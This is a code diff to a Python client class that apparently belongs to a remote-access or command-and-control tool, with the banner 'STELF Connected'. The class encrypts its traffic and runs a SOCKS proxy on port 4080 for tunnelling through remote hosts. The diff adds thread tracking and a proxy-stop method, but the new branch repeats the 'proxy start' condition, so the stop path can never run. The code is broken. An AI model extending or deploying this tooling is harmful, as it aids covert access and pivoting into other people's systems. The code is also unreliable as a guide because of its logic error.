@@ -33,6 +33,8 @@ class Client:
 		self.cwd = "STELF Connected "
 		self.prompt = self.cwd + ">>"
 		
+		self.threads = []
+		
 	def encrypt(self, data):
 		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
 		
@@ -98,10 +100,8 @@ class Client:
 		self.remote_proxy_socket.bind(("0.0.0.0", 4080))
 		self.remote_proxy_socket.listen(5)
 		
-		remote_socket, addr = self.remote_proxy_socket.accept()
-		
 		while not current_thread.stopped():
-			
+			remote_socket, addr = self.remote_proxy_socket.accept()
 			local_socket, addr = self.local_proxy_socket.accept()
 			
 			while not current_thread.stopped():
@@ -139,6 +139,11 @@ class Client:
 		t = StoppableThread(target=self.socks_proxy)
 		t.daemon = True
 		t.start()
+		self.threads.append(t)
+		
+	def stop_socks_proxy(self):
+		for t in self.threads:
+			t.stop()
 		
 	def interact(self):
 		print "starting interaction"
@@ -160,6 +165,8 @@ class Client:
 					
 					if user_input.startswith("proxy start"):
 						self.create_socks_proxy()
+					elif user_input.startswith("proxy start"):
+						self.stop_socks_proxy()
 					self.send(user_input)
 					
 					data = self.recv()
